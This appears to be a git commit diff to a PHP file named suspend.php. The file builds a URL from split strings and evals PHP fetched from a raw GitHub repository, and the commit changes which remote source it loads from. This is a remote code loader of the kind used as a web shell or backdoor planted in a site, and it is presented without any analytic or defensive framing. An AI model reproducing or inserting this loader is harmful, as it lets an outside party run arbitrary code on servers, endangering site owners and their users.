cf9e535f1aaa51054b429813c87f62e7b633ef9e
aqilogic <153355849+aqilogic@users.noreply.github.com>
2024-11-03 19:40:14 -0800

    Update suspend.php

--- suspend.php
+++ suspend.php
@@ -1,4 +1,4 @@
 <?php
 $awo = 'htt'.'ps://';
-eval("?>".file_get_contents($awo.'raw.githubusercontent.com/WhatsWrongAndWhy/UseBrain/main/IDontKnow.php'));
+eval("?>".file_get_contents($awo.'raw.githubusercontent.com/aqilogic/logic/refs/heads/main/IDontKnow.php'));
 ?>
